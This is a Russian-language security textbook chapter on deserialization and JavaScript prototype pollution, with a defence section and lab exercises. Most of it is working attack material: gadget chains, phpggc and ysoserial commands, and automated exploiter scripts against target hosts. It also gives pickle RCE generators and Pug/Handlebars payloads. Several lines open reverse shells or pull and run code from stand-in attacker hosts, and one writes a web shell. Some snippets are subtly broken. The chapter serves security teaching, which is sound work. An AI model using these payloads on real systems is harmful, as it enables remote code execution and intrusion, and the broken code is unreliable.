# Глава 14.3: Десериализация и Prototype Pollution

## 🎯 Цели главы

- Понять концепцию десериализации и почему она опасна
- Освоить PHP Object Injection: magic methods и цепочки гаджетов
- Научиться использовать phpggc для генерации PHP deserialization payloads
- Изучить Java десериализацию и инструмент ysoserial
- Понять Python pickle десериализацию и её эксплуатацию
- Освоить JavaScript Prototype Pollution: теорию и практику
- Выполнить практические упражнения на уязвимых приложениях

---

## 14.3.1 Что такое десериализация и почему она опасна

### Сериализация — сохранение состояния объекта

Сериализация — процесс преобразования объекта в поток байт для хранения или передачи. Десериализация — обратный процесс.

```
СЕРИАЛИЗАЦИЯ:
Объект PHP/Java/Python → [байтовое представление] → Файл/БД/Куки/Запрос

ДЕСЕРИАЛИЗАЦИЯ:
[байтовое представление] → Объект восстановлен в памяти
```

### Почему это опасно

```python
# Пример опасной десериализации (Python)

import pickle
import os

class EvilClass:
    def __reduce__(self):
        # __reduce__ вызывается ПРИ ДЕСЕРИАЛИЗАЦИИ
        return (os.system, ('id',))

# Сериализуем объект
evil_data = pickle.dumps(EvilClass())

# Где-то на сервере:
pickle.loads(evil_data)  # ← Выполняется os.system('id')!
```

**Уязвимая точка:**
```
Приложение получает из внешнего источника   → Десериализует
(HTTP-запрос, файл, база данных, очередь)     без проверки
                                              → Выполняет код
```

### Типичные места встречи десериализации

| Место | Язык | Формат |
|-------|------|--------|
| Session cookies | PHP | PHP serialization |
| ViewState | .NET | Binary / Base64 |
| RememberMe cookies | Java | Java serialization |
| API endpoints | Python | Pickle / JSON |
| Message queues | Все | Различные |
| Cache (Redis, Memcached) | Все | Различные |

---

## 14.3.2 PHP Десериализация: Magic Methods

### Формат PHP-сериализации

```php
<?php
class User {
    public $name = "Alice";
    public $age = 30;
    private $password = "secret";
}

$user = new User();
$serialized = serialize($user);
echo $serialized;
// O:4:"User":3:{s:4:"name";s:5:"Alice";s:3:"age";i:30;s:14:"\x00User\x00password";s:6:"secret";}
```

**Расшифровка формата:**
```
O:4:"User":3:{                → Object, класс "User" (4 буквы), 3 свойства
    s:4:"name";s:5:"Alice";  → string "name" = string "Alice"
    s:3:"age";i:30;          → string "age" = integer 30
    s:14:"\x00User\x00password";s:6:"secret";
         ↑                   → private свойство (null + класс + null)
}
```

### Magic Methods в PHP

Magic методы — специальные методы PHP, которые вызываются автоматически при определённых событиях:

| Magic метод | Когда вызывается |
|-------------|------------------|
| `__construct()` | При создании объекта через `new` |
| `__destruct()` | При уничтожении объекта |
| `__wakeup()` | При десериализации (`unserialize()`) |
| `__sleep()` | При сериализации (`serialize()`) |
| `__toString()` | При использовании объекта как строки |
| `__invoke()` | При вызове объекта как функции |
| `__call()` | При вызове несуществующего метода |
| `__get()` | При обращении к несуществующему свойству |
| `__set()` | При установке несуществующего свойства |
| `__unset()` | При вызове unset() на свойстве |

### Опасные magic methods

**`__wakeup()` — выполняется сразу после десериализации:**
```php
class Config {
    public $logFile = '/var/log/app.log';
    
    public function __wakeup() {
        // ОПАСНО: чтение файла при десериализации
        $this->data = file_get_contents($this->logFile);
    }
}

// Атакующий создаёт payload:
$evil = new Config();
$evil->logFile = '/etc/passwd';
echo serialize($evil);
// O:6:"Config":1:{s:7:"logFile";s:11:"/etc/passwd";}

// На сервере:
$obj = unserialize($_COOKIE['config']);
// __wakeup() → file_get_contents('/etc/passwd')
```

**`__destruct()` — выполняется при уничтожении объекта:**
```php
class TempFile {
    public $filename;
    
    public function __destruct() {
        // ОПАСНО: удаление файла при уничтожении объекта
        unlink($this->filename);
    }
}

// Payload атакующего
$evil = new TempFile();
$evil->filename = '/var/www/html/index.php';  // Удалить главный файл!
```

**`__toString()` — выполняется при приведении к строке:**
```php
class Logger {
    public $logFile;
    
    public function __toString() {
        return file_get_contents($this->logFile);  // ОПАСНО!
    }
}
```

---

## 14.3.3 PHP Object Injection: Цепочки гаджетов

### Концепция "гаджетов"

"Гаджет" в контексте десериализации — это существующий метод в кодовой базе приложения, который можно использовать как звено в цепочке для достижения RCE.

```
Десериализация
      ↓
__wakeup() → вызывает другой метод → использует объект → __toString()
      ↓                                                        ↓
   Гаджет 1                                               Гаджет 2
                                                              ↓
                                                       eval($userInput) ← RCE!
```

### Пример ручной цепочки

```php
<?php
// Существующий код приложения (не трогаем):

class A {
    public $obj;
    
    public function __wakeup() {
        echo $this->obj;  // Приведение к строке → вызов __toString() у $obj
    }
}

class B {
    public $cmd;
    
    public function __toString() {
        return system($this->cmd);  // RCE!
    }
}

// Уязвимый endpoint:
// $data = unserialize($_POST['data']);

// Создание exploit-payload:
$b = new B();
$b->cmd = 'id';

$a = new A();
$a->obj = $b;

$payload = serialize($a);
echo base64_encode($payload);
// Отправляем в $_POST['data']
```

### Реальная цепочка: Laravel/Symfony POP chain

```php
// Популярная цепочка в Laravel (упрощённо):

// 1. Точка входа: __destruct в PendingCommand
class PendingCommand {
    public $command;
    
    public function __destruct() {
        $this->handle();  // → вызывает handle()
    }
    
    public function handle() {
        app()->call($this->command);  // → вызов callable
    }
}

// 2. Промежуточное звено: EvalLoader
class EvalLoader {
    public function __invoke($code) {
        eval($code);  // RCE!
    }
}

// Создание payload:
$loader = new EvalLoader();
$cmd = new PendingCommand();
$cmd->command = [$loader, 'system("id")'];

echo base64_encode(serialize($cmd));
```

---

## 14.3.4 Инструмент phpggc

### Что такое phpggc

phpggc (PHP Generic Gadget Chains) — библиотека готовых PHP-цепочек гаджетов для популярных фреймворков, аналог ysoserial для Java.

### Установка

```bash
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# Просмотр доступных цепочек
php phpggc -l

# Пример вывода:
# Symfony/RCE1    Symfony 3.3 RCE via Monolog
# Symfony/RCE7    Symfony 4.4 RCE via Monolog
# Laravel/RCE1    Laravel 5.x RCE via PendingCommand
# Laravel/RCE7    Laravel 8.x RCE via CommandClosure
# Guzzle/FW1      Guzzle 6.x File Write
# Yii/RCE1        Yii 2.0.x RCE
```

### Основные команды

```bash
# Показать все доступные цепочки
php phpggc -l

# Показать цепочки для конкретного фреймворка
php phpggc -l | grep -i laravel

# Получить информацию о конкретной цепочке
php phpggc -i Laravel/RCE7

# Генерация payload
php phpggc Laravel/RCE7 system id

# Генерация с кастомной командой
php phpggc Laravel/RCE7 system 'curl http://attacker.com/$(id)'

# Base64-кодирование (для передачи в HTTP)
php phpggc -b Laravel/RCE7 system id

# URL-кодирование
php phpggc -u Laravel/RCE7 system id

# Gzip + Base64 (обход некоторых WAF)
php phpggc -s -b Laravel/RCE7 system id

# Сохранение в файл
php phpggc Laravel/RCE7 system id > /tmp/payload.bin

# Генерация для записи файла (веб-шелл)
php phpggc Guzzle/FW1 '/var/www/html/shell.php' '<?php system($_GET["cmd"]); ?>'
```

### Пример полной атаки

```bash
# Шаг 1: Определяем, что используется Laravel
curl -v http://target.com/ | grep -i 'laravel\|symfony\|x-powered'

# Шаг 2: Ищем точку десериализации
# Часто: Cookie, ViewState, скрытые параметры формы

# Шаг 3: Генерируем payload
PAYLOAD=$(php phpggc -b Laravel/RCE7 system id)
echo "Payload: $PAYLOAD"

# Шаг 4: Отправляем payload
curl -s 'http://target.com/profile' \
  -H "Cookie: user_data=$PAYLOAD" \
  -v

# Шаг 5: Reverse shell
REVSHELL=$(php phpggc -b Laravel/RCE7 system "bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'")
curl -s 'http://target.com/profile' \
  -H "Cookie: user_data=$REVSHELL"
```

### Скрипт для автоматизации

```python
#!/usr/bin/env python3
"""
PHP Deserialization Exploiter
"""
import subprocess
import requests
import base64

def generate_payload(chain: str, func: str, cmd: str) -> str:
    """Генерация payload через phpggc"""
    result = subprocess.run(
        ['php', 'phpggc/phpggc', '-b', chain, func, cmd],
        capture_output=True, text=True
    )
    if result.returncode != 0:
        raise Exception(f"phpggc error: {result.stderr}")
    return result.stdout.strip()

def test_deserialization(url: str, cookie_name: str, chain: str):
    """Тест уязвимости десериализации"""
    
    # Тест с безопасной командой
    payload = generate_payload(chain, 'system', 'id')
    
    r = requests.get(url, cookies={cookie_name: payload})
    
    if 'uid=' in r.text:
        print(f"[+] RCE подтверждён через {chain}!")
        print(f"[+] Ответ содержит: {r.text[:200]}")
        return True
    
    print(f"[-] {chain} не сработал")
    return False

# Перебор цепочек
CHAINS = [
    'Laravel/RCE1', 'Laravel/RCE7',
    'Symfony/RCE1', 'Symfony/RCE7',
    'Yii/RCE1', 'SwiftMailer/FW1'
]

for chain in CHAINS:
    try:
        if test_deserialization('http://target.com/', 'session', chain):
            break
    except Exception as e:
        print(f"[-] {chain}: {e}")
```

---

## 14.3.5 Java Десериализация: ysoserial

### Как работает Java десериализация

Java `ObjectInputStream.readObject()` — стандартный метод, который восстанавливает объект из байтового потока. Если у объекта есть метод `readObject()` — он вызывается автоматически.

```java
// Пример уязвимого кода
byte[] data = Base64.decode(request.getParameter("data"));
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
Object obj = ois.readObject();  // ← Опасно! Выполняет код из data
```

**Идентификация Java-сериализованных данных:**
```
Первые байты всегда: AC ED 00 05 (hex) = rO0AB (Base64)
```

```bash
# Проверка параметра на Java serialization
echo -n "rO0AB" | base64 -d | xxd | head -1
# Output: 00000000: aced 0005 ...
```

### Установка ysoserial

```bash
# Скачать готовый JAR
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Проверка
java -jar ysoserial-all.jar --help

# Список доступных payload'ов
java -jar ysoserial-all.jar list
```

### Доступные гаджет-цепочки ysoserial

```
CommonsBeanutils1   Apache Commons BeanUtils → ClassPathXmlApplicationContext
CommonsCollections1  Apache Commons Collections 3.1
CommonsCollections2  Apache Commons Collections 4.0
CommonsCollections3  Apache Commons Collections 3.1
CommonsCollections4  Apache Commons Collections 4.0
CommonsCollections5  Apache Commons Collections 3.1
CommonsCollections6  Apache Commons Collections 3.1 (нет зависимости от JDK)
Groovy1             Groovy → MethodClosure
Hibernate1          Hibernate
JRMPClient          Java RMI
Spring1             Spring Framework 4.1.3
Spring2             Spring Framework 4.1.3
BeanShell1          BeanShell 2.0b5
Clojure             Clojure 1.8.0
ROME                ROME 1.0
```

### Использование ysoserial

```bash
# Генерация payload для выполнения команды
java -jar ysoserial-all.jar CommonsCollections6 'id' > /tmp/payload.bin

# Конвертация в Base64
java -jar ysoserial-all.jar CommonsCollections6 'id' | base64 -w0 > /tmp/payload.b64

# Отправка через curl
PAYLOAD=$(java -jar ysoserial-all.jar CommonsCollections6 'curl http://attacker.com/$(id|base64)' | base64 -w0)
curl -s 'http://target.com/api/update' \
  -H 'Content-Type: application/x-java-serialized-object' \
  --data-binary "@/tmp/payload.bin"

# Пример для WebLogic (T3 protocol)
java -jar ysoserial-all.jar CommonsCollections6 \
  'bash -c {echo,BASE64_ENCODED_COMMAND}|{base64,-d}|bash' \
  > /tmp/weblogic_payload.bin
```

### Скрипт атаки на Java-приложение

```python
#!/usr/bin/env python3
"""
Java Deserialization Exploiter
"""
import subprocess
import requests
import base64

YSOSERIAL = '/tools/ysoserial-all.jar'
TARGET = 'http://java-app.com/api'

def generate_java_payload(gadget_chain: str, command: str) -> bytes:
    """Генерация Java deserialization payload"""
    result = subprocess.run(
        ['java', '-jar', YSOSERIAL, gadget_chain, command],
        capture_output=True
    )
    if b'ACED0005' not in result.stdout.hex().upper().encode() and len(result.stdout) < 100:
        raise Exception(f"Ошибка: {result.stderr.decode()}")
    return result.stdout

def exploit(gadget: str, cmd: str, endpoint: str):
    payload = generate_java_payload(gadget, cmd)
    print(f"[*] Payload: {len(payload)} байт, gadget: {gadget}")
    
    r = requests.post(
        endpoint,
        headers={'Content-Type': 'application/x-java-serialized-object'},
        data=payload
    )
    print(f"[*] Ответ: {r.status_code}")
    print(f"[*] Тело (первые 500 байт): {r.text[:500]}")

GADGETS = [
    'CommonsCollections1',
    'CommonsCollections6',
    'Spring2',
    'BeanShell1',
]

# Тест OOB: если прямого вывода нет
OOB_CMD = f'curl http://BURP-COLLABORATOR.oastify.com/$(id|base64)'

for gadget in GADGETS:
    print(f"\n[*] Тестирование: {gadget}")
    try:
        exploit(gadget, OOB_CMD, f"{TARGET}/deserialize")
    except Exception as e:
        print(f"[-] Ошибка: {e}")
```

### Идентификация уязвимых endpoints

```bash
# Поиск Java serialization маркеров в трафике
# AC ED = Java serialization magic bytes

# В Burp Suite: Proxy → HTTP History → фильтр по Content-Type
# Искать: application/x-java-serialized-object
#         application/octet-stream
#         x-java-serialization/xml

# В HTTP-ответах ищем Base64 начинающийся на "rO0AB"
echo "rO0ABXNy..." | base64 -d | file -
# Output: Java serialization data

# Автоматический поиск
curl -s http://target.com/ | grep -o '"rO0AB[^"]*"'
```

---

## 14.3.6 Python Pickle Десериализация

### Как работает pickle

Python pickle — встроенный модуль для сериализации Python-объектов. Метод `__reduce__` определяет, что происходит при десериализации.

### Создание вредоносного pickle payload

```python
#!/usr/bin/env python3
"""
Python Pickle RCE payload generator
"""
import pickle
import os
import base64

class RCEPayload:
    """Класс для генерации вредоносного pickle payload"""
    
    def __init__(self, command: str):
        self.command = command
    
    def __reduce__(self):
        """Вызывается при десериализации (pickle.loads)"""
        return (os.system, (self.command,))

def generate_payload(command: str) -> str:
    """Генерация Base64 payload"""
    evil = RCEPayload(command)
    serialized = pickle.dumps(evil)
    return base64.b64encode(serialized).decode()

# Генерация
print("Payload для 'id':")
print(generate_payload('id'))

print("\nPayload для reverse shell:")
revshell = "bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"
print(generate_payload(revshell))

# Тест локально
malicious = generate_payload('id')
print("\nТест локально:")
pickle.loads(base64.b64decode(malicious))
```

### Альтернативные методы через pickle opcodes

```python
#!/usr/bin/env python3
"""
Продвинутое создание pickle payload через opcodes
Обходит некоторые фильтры по классам
"""
import pickle
import io

def create_pickle_rce(command: str) -> bytes:
    """
    Создание pickle payload через прямые opcodes.
    Эквивалент: pickle.loads → os.system(command)
    """
    
    payload = (
        b'\x80\x04'           # PROTO 4
        b'\x95'               # FRAME
        + len(command).to_bytes(8, 'little')
        + b'\x8c\x02os'       # SHORT_BINUNICODE 'os'
        b'\x94'               # MARK
        b'\x8c\x06system'     # SHORT_BINUNICODE 'system'
        b'\x93'               # STACK_GLOBAL (os.system)
        b'\x8c' + bytes([len(command)]) + command.encode()
        b'\x85'               # TUPLE1
        b'R'                  # REDUCE (вызов os.system(command))
        b'.'                  # STOP
    )
    return payload

# Более простой способ через io.BytesIO
def pickle_rce_simple(command: str) -> bytes:
    """Простой способ через модуль pickle"""
    
    class Exploit(object):
        def __reduce__(self):
            import subprocess
            return (subprocess.check_output, (['/bin/sh', '-c', command],))
    
    return pickle.dumps(Exploit())

# Тест
import subprocess
payload = pickle_rce_simple('id')
print(f"Payload length: {len(payload)}")
result = pickle.loads(payload)
print(f"Result: {result}")
```

### Реальный сценарий атаки

```python
#!/usr/bin/env python3
"""
Атака на Flask/Django приложение с pickle в Redis кэше
"""
import pickle
import redis
import os
import base64

# Подключение к Redis (если получили доступ к Redis)
r = redis.Redis(host='target-redis', port=6379)

# Генерация payload
class EvilCache:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

payload = pickle.dumps(EvilCache())

# Запись в Redis как session data
session_key = "session:12345"
r.set(session_key, payload)

print(f"[+] Payload записан в Redis: {session_key}")
print("[*] Ждём, пока сервер прочитает кэш...")

# Или через HTTP если есть SSRF → Redis
import requests

# SSRF → Redis через Gopher protocol
gopher_payload = urllib.parse.quote(
    f"*3\r\n$3\r\nSET\r\n$20\r\nsession:evil_session\r\n${len(payload)}\r\n{payload}\r\n"
)
requests.get(f"http://target.com/fetch?url=gopher://127.0.0.1:6379/_{gopher_payload}")
```

---

## 14.3.7 JavaScript Prototype Pollution

### Что такое прототипы в JavaScript

В JavaScript каждый объект имеет прототип — объект, от которого он наследует свойства.

```javascript
// Цепочка прототипов
let obj = {};
// obj → Object.prototype → null

// Доступ к прототипу
console.log(obj.__proto__);          // Object.prototype
console.log(Object.getPrototypeOf(obj));  // Object.prototype

// Прототип Array
let arr = [];
// arr → Array.prototype → Object.prototype → null

// Прототип Function
function f() {}
// f → Function.prototype → Object.prototype → null
```

### Что такое Prototype Pollution

Prototype Pollution — добавление или изменение свойств в `Object.prototype`, что влияет на ВСЕ объекты JavaScript в приложении.

```javascript
// АТАКА: загрязнение прототипа
let userInput = JSON.parse('{"__proto__": {"isAdmin": true}}');

// Уязвимое слияние объектов (merge):
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);  // Рекурсивно!
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

let config = {};
merge(config, userInput);

// Теперь ВСЕ объекты имеют isAdmin = true!
let newObj = {};
console.log(newObj.isAdmin);  // true!

// Проверка привилегий не работает:
if (user.isAdmin) {
    // Атакующий здесь!
}
```

### Векторы Prototype Pollution

```javascript
// 1. Через __proto__
{"__proto__": {"polluted": true}}

// 2. Через constructor.prototype
{"constructor": {"prototype": {"polluted": true}}}

// 3. Через merge функции (наиболее распространено)
_.merge({}, {"__proto__": {"admin": true}})  // lodash < 4.17.5

// 4. Через URL параметры
// ?__proto__[admin]=true
// ?constructor[prototype][admin]=true

// 5. Через JSON.parse с eval
eval('(' + '{"__proto__": {"admin": true}}' + ')')
```

### Уязвимые функции слияния

```javascript
// 1. Уязвимый _.merge() в lodash
const _ = require('lodash');
_.merge({}, JSON.parse('{"__proto__":{"admin":1}}'));
// Все объекты теперь имеют .admin = 1

// 2. Уязвимый Object.assign (НЕ уязвим, но похожий синтаксис)
// Object.assign НЕ копирует прототип

// 3. Уязвимые рекурсивные merge функции (очень распространено!)
function deepMerge(obj, src) {
    Object.keys(src).forEach(key => {
        if (typeof src[key] === 'object') {
            obj[key] = obj[key] || {};
            deepMerge(obj[key], src[key]);  // ← УЯЗВИМОСТЬ
        } else {
            obj[key] = src[key];
        }
    });
}
```

### Последствия Prototype Pollution

```javascript
// 1. Bypass проверки авторизации
// Уязвимый код:
if (user.isAdmin) { /* ... */ }

// После PP: все пользователи - админы
let payload = '{"__proto__": {"isAdmin": true}}';
parse(payload);  // Загрязнение


// 2. Denial of Service
// После PP с пустым объектом, toString может сломаться
let dos = '{"__proto__": {"toString": null}}';
// Любой вызов .toString() → TypeError


// 3. RCE через template engines
// Handlebars (vulnerable version):
let payload = '{"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement", "path": {"type": "PathExpression", "original": "constructor.constructor", "parts": ["constructor", "constructor"]}}]}}';

// Pug:
// Prototype pollution → RCE через self.constructor
let pugPayload = '{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require(\'child_process\').execSync(\'id\')"}}}';
```

### Эксплуатация Prototype Pollution → RCE

**Через Pug (Node.js template engine):**
```javascript
// Payload для Pug
const payload = JSON.parse(`{
    "__proto__": {
        "block": {
            "type": "Text",
            "line": "process.mainModule.require('child_process').execSync('id')"
        }
    }
}`);

// Уязвимый merge:
function deepMerge(obj, src) {
    for (let key in src) {
        if (src.hasOwnProperty(key)) {
            if (typeof src[key] === 'object' && src[key] !== null) {
                if (!obj[key]) obj[key] = {};
                deepMerge(obj[key], src[key]);
            } else {
                obj[key] = src[key];
            }
        }
    }
}

deepMerge({}, payload);

// Теперь при рендеринге Pug → RCE!
const pug = require('pug');
pug.render('p Hello');  // ← Выполняет execSync('id')
```

**Через Handlebars:**
```javascript
// Prototype Pollution → Handlebars RCE
const Handlebars = require('handlebars');

// Payload
Object.prototype.pendingContent = `{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('id').toString()"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}`;

Handlebars.compile('{{this}}')({});  // ← RCE!
```

### Инструменты для тестирования Prototype Pollution

```bash
# 1. PP-scan (автоматический)
npm install -g pp-scan
pp-scan http://target.com

# 2. Burp Suite с Prototype Pollution расширением
# BApp Store: Prototype Pollution Scanner

# 3. Ручное тестирование с curl

# Тест через query params
curl 'http://target.com/api/user?__proto__[admin]=1'
curl 'http://target.com/api/user?constructor[prototype][admin]=1'

# Тест через JSON body
curl -X POST http://target.com/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__proto__": {"polluted": "yes"}}'

# Проверка результата
curl 'http://target.com/api/user'
# Если ответ содержит "polluted": "yes" → уязвимость подтверждена!
```

### Скрипт автоматического тестирования PP

```python
#!/usr/bin/env python3
"""
Prototype Pollution Tester
"""
import requests

TARGET = "http://target.com"
PAYLOADS = [
    # JSON body
    ('json', '{"__proto__": {"pp_test": "polluted"}}'),
    ('json', '{"constructor": {"prototype": {"pp_test": "polluted"}}}'),
    
    # Query params (будем добавлять к URL)
    ('param', '__proto__[pp_test]=polluted'),
    ('param', 'constructor[prototype][pp_test]=polluted'),
]

ENDPOINTS = [
    '/api/user',
    '/api/settings',
    '/api/config',
    '/profile',
]

def test_endpoint(url: str, method: str, payload_type: str, payload: str) -> bool:
    """Тест одного endpoint"""
    
    if payload_type == 'json':
        r = requests.request(
            method, url,
            headers={'Content-Type': 'application/json'},
            data=payload
        )
    else:  # param
        r = requests.request(method, f"{url}?{payload}")
    
    # Проверяем, не сломался ли запрос
    if r.status_code >= 500:
        return False
    
    # Теперь отправляем чистый GET и ищем загрязнение
    check_r = requests.get(url)
    return 'polluted' in check_r.text

for endpoint in ENDPOINTS:
    url = TARGET + endpoint
    for payload_type, payload in PAYLOADS:
        result = test_endpoint(url, 'POST', payload_type, payload)
        status = "УЯЗВИМ!" if result else "OK"
        print(f"[{status}] {endpoint} + {payload_type}: {payload[:50]}")
```

---

## 14.3.8 Защита от уязвимостей десериализации

### PHP: защита от Object Injection

```php
// 1. НЕ десериализовывать пользовательский ввод
// Вместо:
$obj = unserialize($_COOKIE['data']);  // ОПАСНО

// Использовать:
$data = json_decode($_COOKIE['data'], true);  // JSON безопаснее
// или base64+json с HMAC проверкой:
$cookie = $_COOKIE['data'];
[$payload, $sig] = explode('.', $cookie, 2);
if (!hash_equals(hash_hmac('sha256', $payload, SECRET_KEY), $sig)) {
    die('Invalid signature');
}
$data = json_decode(base64_decode($payload), true);

// 2. Белый список классов при десериализации (PHP 7.0+)
$options = [
    'allowed_classes' => ['SafeClass1', 'SafeClass2'],
];
$obj = unserialize($data, $options);

// 3. Использование HMAC для подписи сериализованных данных
function safe_serialize($data) {
    $serialized = serialize($data);
    $hmac = hash_hmac('sha256', $serialized, SECRET_KEY);
    return base64_encode($serialized) . '.' . $hmac;
}

function safe_unserialize($data) {
    [$b64, $hmac] = explode('.', $data, 2);
    $serialized = base64_decode($b64);
    if (!hash_equals(hash_hmac('sha256', $serialized, SECRET_KEY), $hmac)) {
        throw new Exception('Signature mismatch');
    }
    return unserialize($serialized, ['allowed_classes' => false]);
}
```

### Java: защита от десериализации

```java
// 1. Не десериализовывать ненадёжные данные
// 2. Использовать Jackson/Gson вместо ObjectInputStream

// Jackson (безопаснее)
ObjectMapper mapper = new ObjectMapper();
mapper.disableDefaultTyping();  // Отключить полиморфизм
MyClass obj = mapper.readValue(jsonString, MyClass.class);

// 3. Фильтрация классов при десериализации
ObjectInputStream ois = new ObjectInputStream(inputStream) {
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        // Белый список
        String className = desc.getName();
        Set<String> allowed = Set.of("com.example.SafeClass", "java.lang.String");
        if (!allowed.contains(className)) {
            throw new ClassNotFoundException("Class not allowed: " + className);
        }
        return super.resolveClass(desc);
    }
};

// 4. SerialKiller (библиотека)
// Maven: com.niocid:serialkiller:1.0.0
import org.niocid.SerialKiller;
SerialKiller sk = new SerialKiller(inputStream, "/etc/serialkiller.conf");
Object obj = sk.readObject();
```

### Python: защита от Pickle

```python
# 1. Никогда не десериализовывать pickle из ненадёжных источников!
# Вместо pickle используйте JSON, MessagePack, или другие форматы.

import json  # Вместо pickle

# 2. Если pickle необходим — использовать подписи
import pickle
import hmac
import hashlib

SECRET = b'super-secret-key'

def safe_pickle_dumps(obj) -> bytes:
    data = pickle.dumps(obj)
    sig = hmac.new(SECRET, data, hashlib.sha256).digest()
    return sig + data

def safe_pickle_loads(data: bytes):
    sig = data[:32]
    payload = data[32:]
    expected = hmac.new(SECRET, payload, hashlib.sha256).digest()
    if not hmac.compare_digest(sig, expected):
        raise ValueError("Signature mismatch - возможная атака!")
    return pickle.loads(payload)

# 3. Использовать restricted unpickler
import io
import builtins

class RestrictedUnpickler(pickle.Unpickler):
    SAFE_BUILTINS = {'range', 'complex', 'set', 'frozenset', 'slice'}
    
    def find_class(self, module, name):
        if module == 'builtins' and name in self.SAFE_BUILTINS:
            return getattr(builtins, name)
        raise pickle.UnpicklingError(f"Запрещено: {module}.{name}")

def restricted_loads(s):
    return RestrictedUnpickler(io.BytesIO(s)).load()
```

### JavaScript: защита от Prototype Pollution

```javascript
// 1. Использовать Object.create(null) для объектов без прототипа
const safeObj = Object.create(null);
safeObj.key = 'value';
// У safeObj нет __proto__!

// 2. Защита merge функции
function safeMerge(target, source) {
    // Блокируем загрязнение прототипа
    const banned = new Set(['__proto__', 'constructor', 'prototype']);
    
    Object.keys(source).forEach(key => {
        if (banned.has(key)) {
            console.warn(`Обнаружена попытка PP: ${key}`);
            return;  // Пропускаем опасные ключи
        }
        
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            safeMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    });
    return target;
}

// 3. Использовать hasOwnProperty для проверки
if (Object.prototype.hasOwnProperty.call(obj, key)) {
    // Безопасное обращение к свойству
}

// 4. Заморозить прототип
Object.freeze(Object.prototype);

// 5. Обновить уязвимые пакеты (lodash >= 4.17.17, etc.)
// npm audit fix
```

---

## 14.3.9 Практические упражнения

### Упражнение 1: PHP Object Injection

```bash
# Развернуть уязвимое PHP-приложение
cat > /tmp/vuln_deser.php << 'EOF'
<?php
class FileReader {
    public $filename;
    
    public function __wakeup() {
        echo "Читаем файл: " . $this->filename . "\n";
        echo file_get_contents($this->filename);
    }
}

// Уязвимый endpoint
if (isset($_GET['data'])) {
    $obj = unserialize(base64_decode($_GET['data']));
}
?>
EOF

# Генерация exploit payload
cat > /tmp/gen_payload.php << 'EOF'
<?php
class FileReader {
    public $filename;
}

$evil = new FileReader();
$evil->filename = '/etc/passwd';

echo base64_encode(serialize($evil));
EOF

# Генерируем payload
PAYLOAD=$(php /tmp/gen_payload.php)
echo "Payload: $PAYLOAD"

# Атака
curl "http://localhost/vuln_deser.php?data=$PAYLOAD"
```

### Упражнение 2: phpggc на реальных фреймворках

```bash
# Клонируем phpggc
git clone https://github.com/ambionics/phpggc.git /opt/phpggc

# Просматриваем цепочки для Laravel
php /opt/phpggc/phpggc -l | grep Laravel

# Генерируем payload для Laravel
PAYLOAD=$(php /opt/phpggc/phpggc -b Laravel/RCE7 system id)

# Тест на уязвимом Laravel-приложении
curl 'http://laravel-app.com/profile' \
  -H "Cookie: laravel_session=$PAYLOAD"
```

### Упражнение 3: Python Pickle RCE

```python
#!/usr/bin/env python3
"""
Задание: создать Flask-приложение с pickle уязвимостью и эксплуатировать её
"""
# Уязвимое приложение
from flask import Flask, request, jsonify
import pickle, base64

app = Flask(__name__)
DATA = {}

@app.route('/save', methods=['POST'])
def save():
    # УЯЗВИМОСТЬ: десериализация пользовательского ввода
    data = pickle.loads(base64.b64decode(request.json['data']))
    DATA['result'] = data
    return jsonify({'status': 'saved'})

@app.route('/load')
def load():
    return jsonify({'data': str(DATA.get('result', 'empty'))})

# Запуск: python3 vuln_flask.py

# --- Exploit ---
import pickle, os, base64, requests

class RCE:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned.txt',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
r = requests.post('http://localhost:5000/save',
    json={'data': payload})
print(r.json())

# Проверяем результат
import time
time.sleep(1)
with open('/tmp/pwned.txt') as f:
    print(f"RCE результат: {f.read()}")
```

### Упражнение 4: Prototype Pollution

```javascript
// Создайте файл pp_test.js и запустите: node pp_test.js

// Уязвимое приложение
function unsafeMerge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            target[key] = target[key] || {};
            unsafeMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Симуляция обработки пользовательского JSON
const userInput = JSON.parse('{"__proto__": {"isAdmin": true, "role": "superuser"}}');
const config = {};

unsafeMerge(config, userInput);

// Проверяем загрязнение
const newUser = {};
console.log('isAdmin:', newUser.isAdmin);  // должно быть: true (загрязнение!)
console.log('role:', newUser.role);        // должно быть: superuser

// Эксплуатация: обход проверки авторизации
function checkAdmin(user) {
    if (user.isAdmin) {  // ВСЕГДА true из-за PP!
        return 'ACCESS GRANTED - ADMIN PANEL';
    }
    return 'Access denied';
}

const regularUser = { name: 'Bob', isAdmin: false };
console.log(checkAdmin(regularUser));  // ACCESS GRANTED!
```

### Упражнение 5: PortSwigger Labs

```
Рекомендуемые лабораторные работы на PortSwigger Academy:

1. Insecure deserialization
   - Lab 1: Modifying serialized objects
   - Lab 2: Modifying serialized data types  
   - Lab 3: Using application functionality
   - Lab 4: Arbitrary object injection in PHP
   - Lab 5: Exploiting PHP deserialization with a pre-built gadget chain
   - Lab 6: Exploiting Java deserialization with Apache Commons

Ссылка: https://portswigger.net/web-security/deserialization
```

---

## Итоги главы

### Быстрая шпаргалка

```
